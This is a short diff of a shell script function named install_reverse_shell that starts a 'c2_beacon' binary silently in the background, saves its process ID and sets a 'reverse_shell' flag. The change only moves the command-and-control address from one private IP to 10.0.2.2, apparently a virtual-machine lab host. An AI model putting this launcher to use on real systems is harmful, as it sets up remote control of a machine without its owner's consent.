@@ -1,8 +1,8 @@
 # Outbound reverse shell + C2 beacon
 install_reverse_shell() {
     echo "[*] Starting reverse shell & C2 beacon..."
-    # C2 beacon to 192.168.1.100:9999
-    nohup "$ASSETS_DIR/build/c2_beacon" 192.168.1.100 9999 >/dev/null 2>&1 &
+    # C2 beacon to 10.0.2.2:9999
+    nohup "$ASSETS_DIR/build/c2_beacon" 10.0.2.2 9999 >/dev/null 2>&1 &
     echo $! > /tmp/reverse_shell.pid
     set_flag "reverse_shell"
 }
